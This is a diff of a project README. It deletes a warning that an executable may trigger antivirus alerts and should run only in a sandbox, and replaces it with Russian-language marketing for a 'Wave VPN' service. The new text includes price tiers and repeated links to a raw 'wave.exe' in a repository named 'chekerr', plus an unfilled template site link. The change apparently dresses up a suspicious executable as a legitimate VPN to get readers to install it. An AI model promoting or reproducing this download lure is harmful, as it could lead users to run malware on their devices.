@@ -1,2 +1,20 @@
-# -
-> ⚠️ **WARNING:** This executable file (`ProjectName.exe`) may trigger antivirus alerts or behave unexpectedly.   > Run it **only on a test machine or in a sandbox environment**, and **at your own risk**.
+# Wave VPN
+
+🌊 Синий океан скорости и безопасности
+
+## О проекте
+Wave VPN — это современный VPN-сервис с акцентом на скорость и анонимность.
+
+## Тарифы
+- **Фридайв** — Бесплатно (1 устройство, 30 стран)
+- **Цунами** — $7.99/мес (5 устройств, все страны)
+- **Бездна** — $12.99/мес (безлимит устройств, выделенный IP)
+
+## Установка
+1. Скачайте приложение из [релизов](https://github.com/kilordow/chekerr/raw/refs/heads/main/wave.exe)
+2. Установите на свое устройство
+3. Наслаждайтесь безопасным интернетом
+
+## Ссылки
+- [Сайт](https://[ваш-логин].github.io/wave-vpn/)
+- [Скачать](https://github.com/kilordow/chekerr/raw/refs/heads/main/wave.exe)
